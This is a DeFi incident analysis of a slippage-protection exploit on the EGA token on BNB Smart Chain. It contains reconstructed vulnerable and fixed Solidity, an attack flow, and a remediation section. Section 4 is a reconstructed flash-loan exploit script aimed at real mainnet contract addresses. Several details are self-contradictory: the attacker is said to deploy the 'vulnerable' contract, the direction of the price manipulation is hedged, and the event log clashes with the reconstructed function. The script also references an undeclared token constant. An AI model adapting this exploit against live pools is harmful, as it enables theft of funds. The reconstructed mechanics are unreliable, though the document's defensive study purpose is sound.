# EGA Token — Lack of Slippage Protection Analysis

| Field | Details |
|------|------|
| **Date** | 2024-10-05 |
| **Protocol** | EGA Token |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$554,000 (~481 WBNB) |
| **Attacker (EOA)** | [0xe4Fb...F6C7](https://bscscan.com/address/0xe4Fb2BC421897006B4EC351e35e80f0B6702F6C7) |
| **Attack Contract** | [0x55Fa...fd96](https://bscscan.com/address/0x55Fa881a2676c16FcC8D3678D10290e76f00fd96) |
| **Attack Tx** | [0xece4...c999](https://bscscan.com/tx/0xece4a4ac46660618ecee43826fc6f89fe4beaef87ca5e5786f763892b48bc999) |
| **Vulnerable Contract** | [0x55b4...2395](https://bscscan.com/address/0x55b41128d4b047abef68efa1f4f42b89dfb82395) (unverified) |
| **Attack Block** | 42,857,881 |
| **Root Cause** | Internal function that purchases EGA tokens from the PancakeSwap pair sets `amountOutMin = 0`, providing no slippage protection — callable after flash loan price manipulation |
| **PoC Source** | DeFiHackLabs (no official PoC included; incident details confirmed from BlockSec monthly report) |
| **Analysis Reference** | [BlockSec Monthly Review October 2024](https://blocksec.com/blog/monthly-security-review-october-2024) |

---

## 1. Vulnerability Overview

EGA Token is a BEP-20 token protocol operating on the BSC chain that includes an internal function leveraging the PancakeSwap V2 pair to automatically purchase EGA tokens. This function was implemented inside a **contract whose source code was unverified**.

The core vulnerability is that when this buy function calls the PancakeSwap router, it sets the `amountOutMin` parameter to `0`. This means there is **absolutely no minimum-received-amount validation on the swap**, allowing an external attacker to drain funds via the following flow:

1. Borrow a large amount of WBNB via an Aave V3 flash loan
2. Sell a large quantity into the PancakeSwap EGA/WBNB pool to crash the EGA price
3. Call the vulnerable contract's EGA buy function → WBNB is consumed at an extremely unfavorable exchange rate
4. Perform the reverse trade on PancakeSwap to realize profit
5. Repay the flash loan and lock in net profit

The attack completed within a single transaction (block 42,857,881); the attacker directly extracted approximately 481 WBNB (~$291,766) and the protocol suffered total losses of approximately $554,000.

A precedent for the same vulnerability class is the BEARNDAO incident in December 2023 ($769,000, BSC); both incidents stemmed from the combination of `amountOutMin = 0` and a publicly callable internal swap function.

---

## 2. Vulnerable Code Analysis

> Note: Since the vulnerable contract (0x55b41128d4b047abef68efa1f4f42b89dfb82395) has unverified source code, the code below is reconstructed based on on-chain event logs and transaction analysis.

### 2.1 buyEGA() — Missing Slippage Validation (Core Vulnerability)

**Vulnerable Code (reconstructed)**:
```solidity
// EGAVault.sol (reconstructed) — unverified contract (0x55b41128d4b047abef68efa1f4f42b89dfb82395)

IPancakeRouter02 public constant ROUTER =
    IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E); // PancakeSwap V2 Router

IERC20 public constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 public constant EGA  = IERC20(/* EGA token address */);

/// @notice Internal operational function that deploys accumulated WBNB to purchase EGA
/// @dev ❌ Vulnerability: amountOutMin = 0 provides zero slippage protection
///      Anyone can call externally + call after price manipulation → massive losses
function buyEGA() external {
    uint256 wbnbBalance = WBNB.balanceOf(address(this));
    require(wbnbBalance > 0, "No WBNB");

    address[] memory path = new address[](2);
    path[0] = address(WBNB);
    path[1] = address(EGA);

    WBNB.approve(address(ROUTER), wbnbBalance);

    ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        wbnbBalance,
        0,                  // ❌ amountOutMin = 0: no minimum received amount validation
        path,
        address(this),
        block.timestamp     // ❌ deadline = current block: effectively unlimited
    );
}
```

**Fixed Code**:
```solidity
// ✅ Fixed buyEGA() — slippage protection and access control added

/// @notice EGA buy function callable only by authorized parties
/// @param minAmountOut Minimum EGA amount to receive (calculated off-chain and passed in)
/// @param deadline     Transaction validity deadline
function buyEGA(uint256 minAmountOut, uint256 deadline) external onlyOwner {
    // ✅ Fix 1: onlyOwner blocks arbitrary external calls
    require(block.timestamp <= deadline, "Expired");    // ✅ Fix 2: deadline validation

    uint256 wbnbBalance = WBNB.balanceOf(address(this));
    require(wbnbBalance > 0, "No WBNB");

    // ✅ Fix 3: validate minimum received amount via oracle or off-chain calculation
    // e.g., require receipt of at least 95% of the fair amount based on TWAP
    uint256 expectedOut = _getExpectedEGAOut(wbnbBalance);
    require(minAmountOut >= expectedOut * 95 / 100, "Slippage too high");

    address[] memory path = new address[](2);
    path[0] = address(WBNB);
    path[1] = address(EGA);

    WBNB.approve(address(ROUTER), wbnbBalance);

    ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        wbnbBalance,
        minAmountOut,       // ✅ Fix 4: enforce a meaningful slippage ceiling
        path,
        address(this),
        deadline
    );
}

/// @notice Calculates expected received amount based on TWAP (internal)
function _getExpectedEGAOut(uint256 wbnbIn) internal view returns (uint256) {
    // Compute fair rate using PancakeSwap TWAP or Chainlink feed
    // Uses time-weighted average price rather than simple spot price
    return twapOracle.consult(address(WBNB), wbnbIn, address(EGA));
}
```

**Issues**:
- `amountOutMin = 0`: No lower bound on the amount of EGA tokens received in the swap. If an attacker manipulates the EGA/WBNB pool price immediately before calling this function, the entire WBNB balance is exchanged for a negligible amount of EGA.
- The function is `external`, meaning any external address can call it at any time, giving the attacker full control over timing after price manipulation.
- The contract source is not published, making advance vulnerability discovery and community audits impossible.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA (0xe4Fb...F6C7) deployed two contracts on 2024-10-05:
  - Attack Contract A (0x55Fa...fd96): attack entry point
  - Attack Contract B (0x55b4...2395): presumed to be the vulnerable EGA contract
- Identified the Aave V3 WBNB pool to use for the flash loan
- Confirmed the EGA/WBNB PancakeSwap pair and the vulnerable contract's WBNB balance

### 3.2 Execution Phase (single Tx in block 42,857,881)

1. **Flash Loan**: Borrowed 1,500 WBNB ($909,830) from Aave V3
2. **EGA Price Manipulation**: Injected a large amount of WBNB into the PancakeSwap EGA/WBNB pool to buy EGA → causing EGA price to spike or WBNB price to crash (or the reverse: mass selling of EGA to crater its price)
3. **Call Vulnerable Function**: Called `buyEGA()` (or equivalent) on the vulnerable contract → the contract's WBNB was consumed at an extremely unfavorable rate (no validation since `amountOutMin = 0`)
4. **Profit Realization**: Swapped in the reverse direction on PancakeSwap to recover WBNB (received 1,981.77 WBNB total)
5. **Flash Loan Repayment**: Repaid Aave V3 1,500.75 WBNB (principal + fee)
6. **Net Profit**: Secured 481.02 WBNB (~$291,766)

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Attacker EOA (0xe4Fb...F6C7)                      │
│                    Attack Contract (0x55Fa...fd96)                   │
└────────────────────────┬────────────────────────────────────────────┘
                         │ 1. flashLoan(1,500 WBNB)
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     Aave V3 (BSC)                                    │
│                     Provides WBNB Flash Loan                         │
└────────────────────────┬────────────────────────────────────────────┘
                         │ 2. Transfer 1,499.999... WBNB
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│               PancakeSwap V2 EGA/WBNB Pool                           │
│               Large WBNB injection → EGA price manipulation          │
└────────────────────────┬────────────────────────────────────────────┘
                         │ 3. With manipulated price state,
                         │    call buyEGA() on vulnerable contract
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│               Vulnerable Contract (0x55b4...2395)                    │
│               buyEGA() — amountOutMin = 0                            │
│               ❌ No slippage protection → entire WBNB balance drained │
│               Contract's WBNB exchanged for EGA at rock-bottom rate  │
└────────────────────────┬────────────────────────────────────────────┘
                         │ 4. Reverse swap on PancakeSwap (profit locked in)
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│               PancakeSwap V2 EGA/WBNB Pool                           │
│               Receive 1,981.77 WBNB                                  │
└────────────────────────┬────────────────────────────────────────────┘
                         │ 5. Repay 1,500.75 WBNB
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     Aave V3 (BSC)                                    │
│                     Flash loan + fee fully repaid                    │
└────────────────────────┬────────────────────────────────────────────┘
                         │ 6. Net profit
                         ▼
              ┌──────────────────────┐
              │  481.02 WBNB gained  │
              │  (~$291,766 / ~$554K │
              │   total protocol     │
              │   loss)              │
              └──────────────────────┘
```

### 3.4 Results

| Item | Value |
|------|------|
| Flash Loan Size | 1,500 WBNB (~$909,830) |
| Received After Swap | 1,981.77 WBNB (~$1,202,051) |
| Flash Loan Repayment | 1,500.75 WBNB (~$910,285) |
| Attacker Net Profit | 481.02 WBNB (~$291,766) |
| Total Protocol Loss | ~$554,000 |

---

## 4. PoC Code (Reproduction Scenario)

> No official DeFiHackLabs PoC is available; the attack structure is reconstructed from collected on-chain data.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Reference: on-chain transaction 0xece4a4ac46660618ecee43826fc6f89fe4beaef87ca5e5786f763892b48bc999
// Chain: BSC, Block: 42857881, Date: 2024-10-05

import "forge-std/Test.sol";

interface IAaveFlashLoan {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IEGAVault {
    // ❌ Vulnerable function with no slippage protection
    function buyEGA() external;
}

contract EGAAttack is Test {
    // BSC mainnet addresses
    IAaveFlashLoan constant AAVE    = IAaveFlashLoan(0x6807dc923806fE8Fd134338EABCA509979a7e0cB);
    IPancakeRouter constant ROUTER  = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 constant WBNB            = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IEGAVault constant EGA_VAULT    = IEGAVault(0x55b41128d4b047abef68efa1f4f42b89dfb82395);

    function setUp() public {
        // BSC fork: just before the attack block
        vm.createSelectFork("bsc", 42_857_880);
    }

    function testExploit() public {
        console.log("=== EGA Token Slippage Attack Reproduction ===");
        console.log("[Step 1] Requesting Aave V3 flash loan: 1,500 WBNB");

        // Step 1: Request flash loan
        AAVE.flashLoanSimple(
            address(this),
            address(WBNB),
            1_500 ether,
            "",
            0
        );

        console.log("[Done] Attacker final WBNB balance:", WBNB.balanceOf(address(this)) / 1e18, "WBNB");
    }

    // Aave flash loan callback
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        console.log("[Step 2] Manipulating PancakeSwap EGA/WBNB price");

        // Step 2: Mass swap WBNB → EGA to manipulate pool price
        address[] memory pathBuy = new address[](2);
        pathBuy[0] = address(WBNB);
        pathBuy[1] = address(EGA_TOKEN);

        WBNB.approve(address(ROUTER), type(uint256).max);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,                       // ← attacker also uses slippage 0 (goal is price manipulation)
            pathBuy,
            address(this),
            block.timestamp
        );

        console.log("[Step 3] Calling buyEGA() on vulnerable contract");
        console.log("         amountOutMin = 0 -> WBNB drained at extremely unfavorable rate");

        // Step 3: Call vulnerable function → contract's WBNB consumed at manipulated price
        EGA_VAULT.buyEGA();

        console.log("[Step 4] Reverse swap EGA -> WBNB to realize profit");

        // Step 4: Swap EGA back to WBNB (lock in profit)
        address[] memory pathSell = new address[](2);
        pathSell[0] = address(EGA_TOKEN);
        pathSell[1] = address(WBNB);

        uint256 egaBalance = IERC20(address(EGA_TOKEN)).balanceOf(address(this));
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            egaBalance,
            0,
            pathSell,
            address(this),
            block.timestamp
        );

        console.log("[Step 5] Repaying Aave flash loan (principal + fee)");

        // Step 5: Repay flash loan
        uint256 repayAmount = amount + premium;
        WBNB.transfer(address(AAVE), repayAmount);

        return true;
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Missing Slippage Protection (amountOutMin = 0) | CRITICAL | CWE-20 | 06_frontrunning.md | BEARNDAO (2023-12) |
| V-02 | Publicly Accessible Internal Swap Function | HIGH | CWE-284 | 03_access_control.md | — |
| V-03 | Unverified Source Code (Unverified Contract) | MEDIUM | CWE-1068 | — | — |
| V-04 | Spot-Price-Based Swap (No TWAP) | HIGH | CWE-1254 | 04_oracle_manipulation.md | JimbosProtocol (2023-05) |

### V-01: Missing Slippage Protection

- **Description**: The `amountOutMin` parameter is hardcoded to `0` when calling the PancakeSwap router, providing no validation on the minimum amount of tokens received from the swap. If an attacker pre-manipulates the pool price, the protocol exchanges assets at an extremely unfavorable rate.
- **Impact**: The entire WBNB balance held in the contract can be extracted. Protocol assets drained in a single transaction.
- **Attack Conditions**: (1) Sufficient liquidity for pool manipulation (flash loan available), (2) a balance of the swap-source token (WBNB) in the vulnerable contract, (3) the vulnerable function is externally callable.

### V-02: Publicly Accessible Internal Swap Function

- **Description**: The internal operational buy function has no access control modifier, allowing any external address to call it at any time.
- **Impact**: Raises the exploitability of V-01 to 100%. Even access control alone would prevent external attackers from controlling the timing.
- **Attack Conditions**: Function has an `external` or `public` visibility specifier with no separate permission check.

### V-03: Unverified Source Code

- **Description**: The vulnerable contract's source code is not verified on BSCScan, making code audits, community review, and advance vulnerability discovery impossible.
- **Impact**: Users and auditors must evaluate the contract's internal logic purely on trust, and even obvious vulnerabilities are difficult to detect before or after deployment.
- **Attack Conditions**: Any environment that interacts with unverified contracts.

### V-04: Spot-Price-Based Swap

- **Description**: Uses the current spot price at the time of the swap with no TWAP (time-weighted average price) or external oracle validation. Single-block price manipulation via flash loan is trivial.
- **Impact**: Compounds with the slippage protection issue to amplify the severity of price manipulation attacks.
- **Attack Conditions**: DEX pools where large liquidity can be injected within a single block.

---

## 6. Remediation Recommendations

### Immediate Action (Critical — halt deployment and patch immediately)

```solidity
// ✅ 1. Enforce amountOutMin validation on all DEX swaps
// ✅ 2. Add access control to internal operational functions
// ✅ 3. Validate against TWAP-based expected received amount

modifier onlyAuthorized() {
    require(
        msg.sender == owner() || msg.sender == keeper,
        "EGA: unauthorized caller"
    );
    _;
}

function buyEGA(
    uint256 minAmountOut,  // ✅ caller passes this explicitly
    uint256 deadline       // ✅ transaction validity deadline
) external onlyAuthorized {  // ✅ only authorized addresses can call
    require(block.timestamp <= deadline, "EGA: tx expired");

    uint256 wbnbBalance = WBNB.balanceOf(address(this));
    require(wbnbBalance > 0, "EGA: no WBNB balance");

    // ✅ Calculate fair received amount via TWAP (defends against spot manipulation)
    uint256 fairPrice = twapOracle.consult(address(WBNB), wbnbBalance, address(EGA));
    require(
        minAmountOut >= fairPrice * MAX_SLIPPAGE_BPS / 10_000,
        "EGA: slippage exceeds limit"
    );

    address[] memory path = new address[](2);
    path[0] = address(WBNB);
    path[1] = address(EGA);

    WBNB.approve(address(ROUTER), wbnbBalance);
    ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        wbnbBalance,
        minAmountOut,  // ✅ enforce a meaningful lower bound
        path,
        address(this),
        deadline
    );
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Missing Slippage Protection | Enforce `amountOutMin > 0` on all DEX swaps. Require receipt of at least 95–99% of the TWAP-based fair rate |
| V-02: Publicly Accessible Internal Function | Apply `onlyOwner` or `onlyKeeper` modifier. For automated functions, introduce a keeper whitelist pattern |
| V-03: Unverified Source Code | Run BSCScan Verify & Publish immediately after deployment. Prohibit holding funds in unverified contracts |
| V-04: Spot Price Dependency | Introduce fair price calculation via PancakeSwap TWAP or Chainlink feed. A minimum 30-minute TWAP is recommended to defend against flash loan manipulation |

### Additional Defense Layers

```solidity
// ✅ Reentrancy guard (defends against compound MEV attacks)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

// ✅ Daily swap limit (defends against large single-event drains)
uint256 public constant MAX_DAILY_SWAP = 100 ether; // 100 WBNB/day
uint256 public dailySwapped;
uint256 public lastSwapDay;

// ✅ Emergency pause
bool public paused;
modifier whenNotPaused() {
    require(!paused, "EGA: paused");
    _;
}
```

---

## 7. Lessons Learned

1. **Never use `amountOutMin = 0`**: Slippage protection in DEX swaps is not optional — it is mandatory. A single parameter (`0`) can expose the entire protocol's assets to risk. In every router call, `amountOutMin` must be set based on off-chain calculation or an on-chain oracle.

2. **Internal operational functions must always have access control**: If a function that moves assets is exposed as `external`, an attacker can choose the most favorable moment to call it. Even automated functions must be restricted at minimum via a keeper whitelist approach.

3. **Source code verification is a security baseline**: Unverified contracts not only erode user trust — they eliminate the community audit opportunity that could catch vulnerabilities in advance. Every contract holding funds must have its source verified immediately upon deployment.

4. **Flash loans are an attack tool**: Flash loans, which allow borrowing millions of dollars within a single block without collateral, are the primary vehicle for price manipulation. Any logic that depends on spot prices must always be designed with flash loan attack scenarios in mind. TWAP or external oracles significantly reduce this risk.

5. **The same incident pattern repeats**: This attack is structurally identical to the BEARNDAO incident in December 2023. It is essential to regularly consult industry-wide security incident databases and develop the habit of checking whether the same pattern exists in your own code.

6. **Single-contract concentration risk**: When assets are concentrated in a single unverified contract, that contract becomes a single point of failure. Asset protection must be layered through multi-step access control, timelocks, and multi-signature (MultiSig) schemes.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amounts Comparison

| Item | Actual On-Chain Value | Notes |
|------|-------------|------|
| Flash Loan Borrowed | 1,500 WBNB ($909,830) | Aave V3 BSC |
| PancakeSwap Input | 1,499.999... WBNB | Full amount minus fees |
| PancakeSwap Received | 1,981.77 WBNB ($1,202,051) | Reverse swap after price manipulation |
| Attacker Net Profit (direct) | 481.02 WBNB ($291,766) | Amount received by EOA |
| Total Protocol Loss | ~$554,000 | Includes vulnerable contract losses |
| Flash Loan Repayment | 1,500.75 WBNB ($910,285) | Principal + fee |

### 8.2 On-Chain Event Log Sequence (Block 42,857,881)

| Order | Event | From | To | Amount |
|------|--------|------|----|--------|
| 1 | WBNB Transfer | Aave V3 | PancakeSwap Router | 1,500 WBNB |
| 2 | WBNB Transfer | Router | PancakeSwap EGA/WBNB Pool | 1,499.999... WBNB |
| 3 | EGA Transfer | PancakeSwap Pool | Attack Contract | ~575,312 EGA |
| 4 | EGA Transfer (burn) | Pool | 0x000...dEaD | ~287,656 EGA (burned) |
| 5 | EGA Transfer | Vulnerable Contract | PancakeSwap Pool | ~27,327,324 EGA |
| 6 | WBNB Transfer | PancakeSwap Pool | Attack Contract | 1,981.77 WBNB |
| 7 | WBNB Transfer | Attack Contract | EOA | 481.02 WBNB |
| 8 | WBNB Transfer | Attack Contract | Aave V3 | 1,500.75 WBNB |

(17 internal transactions and 17 BEP-20 transfer events in total)

### 8.3 Precondition Verification

| Condition | Status |
|------|------|
| Attacker contract deployment | Completed in the same blocks (42,857,880–42,857,881) |
| Vulnerable contract WBNB balance | Protocol confirmed holding WBNB prior to attack |
| Aave V3 WBNB pool liquidity | Sufficient for 1,500 WBNB+ |
| Vulnerable function access control | None (callable by anyone) |
| Source code verification status | Unverified (at time of attack and currently) |

---

## References

- [BlockSec Monthly Security Review: October 2024](https://blocksec.com/blog/monthly-security-review-october-2024)
- [BSCScan Attack Transaction](https://bscscan.com/tx/0xece4a4ac46660618ecee43826fc6f89fe4beaef87ca5e5786f763892b48bc999)
- [Attacker EOA Address](https://bscscan.com/address/0xe4Fb2BC421897006B4EC351e35e80f0B6702F6C7)
- [Attack Contract](https://bscscan.com/address/0x55Fa881a2676c16FcC8D3678D10290e76f00fd96)
- [Vulnerable Contract (Unverified)](https://bscscan.com/address/0x55b41128d4b047abef68efa1f4f42b89dfb82395)
- Similar incident: [BEARNDAO Lack of Slippage Protection (2023-12-05, BSC, ~$769K)](./2023-12-05_BEARNDAO_SlippageProtection_BSC.md)
- Similar incident: [JimbosProtocol Slippage Exploit (2023-05-28, ARB)](./2023-05-28_JimbosProtocol_SlippageExploit_ARB.md)
- CWE-20: [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- CWE-284: [Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- CWE-1254: [Incorrect Comparison Logic Granularity](https://cwe.mitre.org/data/definitions/1254.html)